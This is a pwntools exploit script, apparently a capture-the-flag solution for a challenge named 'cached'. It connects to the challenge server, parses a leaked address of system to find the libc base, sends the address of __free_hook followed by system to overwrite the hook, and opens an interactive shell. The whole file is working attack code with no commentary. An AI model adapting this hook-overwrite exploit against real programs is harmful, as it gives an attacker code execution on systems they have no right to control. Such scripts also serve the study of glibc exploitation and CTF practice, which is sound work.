from pwn import *
p = remote("cached.chal.idek.team", 1337)
# p = process("./cached_patched", env={"LD_PRELOAD":"libc-2.31.so"})
# context.terminal = ["tmux", "splitw", "-h"]
# gdb.attach(p, """ 
#             continue
#             """)
libc = ELF("libc-2.31.so")
p.sendafter("[Press enter to continue]", "\n")
p.sendafter("[Press enter to continue]", "\n")
p.sendafter("[Press enter to continue]", "\n")
p.sendafter("[Press enter to continue]", "\n")
p.recvuntil("system @ 0x")
system = int(p.recv(12), 16)
libc.address = system - libc.symbols["system"]
free_hook = libc.symbols["__free_hook"]
success("system: %s"%hex(system))
success("free_hook: %s"%hex(free_hook))
success("libc: %s"%hex(libc.address))
p.sendlineafter("```", p64(free_hook))
p.sendlineafter("```", p64(system))

p.interactive()
